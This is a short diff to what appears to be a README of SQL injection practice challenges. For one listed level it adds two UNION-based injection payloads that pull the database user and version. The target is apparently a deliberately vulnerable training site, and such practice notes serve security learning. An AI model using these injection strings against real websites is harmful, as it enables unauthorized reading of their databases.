@@ -35,6 +35,12 @@
 | [Level 7](http://www.zixem.altervista.org/SQLi/level7.php?id=1) | Medium |
 | ------- | ---------- |
 
+In viewsource mode:
+ 
+ `?id=-9999 union select 1,user(),3 ; -- -`
+ 
+ `?id=-9999 union select 1,version(),3 ; -- -`
+
 | [Level 8](http://www.zixem.altervista.org/SQLi/lvl8.php?id=1) | Hard |
 | ------- | ---------- |
 
